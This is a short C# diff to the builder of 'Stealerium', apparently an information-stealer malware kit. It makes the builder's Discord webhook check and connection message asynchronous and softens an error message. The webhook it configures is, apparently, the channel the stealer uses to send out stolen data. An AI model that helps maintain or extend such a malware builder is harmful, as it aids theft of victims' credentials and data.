@@ -6,15 +6,15 @@ namespace Builder;
 internal class Program
 {
     [STAThread]
-    private static void Main()
+    private static async Task Main()
     {
         // Settings
         var token = Cli.GetStringValue("Discord webhook url");
         // Test connection to Discord webhook url
-        if (!Discord.WebhookIsValid(token))
-            Cli.ShowError("Check the fucking webhook url!");
+        if (!await Discord.WebhookIsValidAsync(token))
+                Cli.ShowError("Check the webhook url!");
         else
-            Discord.SendMessage("✅ *Stealerium* builder connected successfully!", token);
+            await Discord.SendMessageAsync("✅ *Stealerium* builder connected successfully!", token);
         Cli.ShowSuccess("Connected successfully!\n");
 
         // Encrypt values
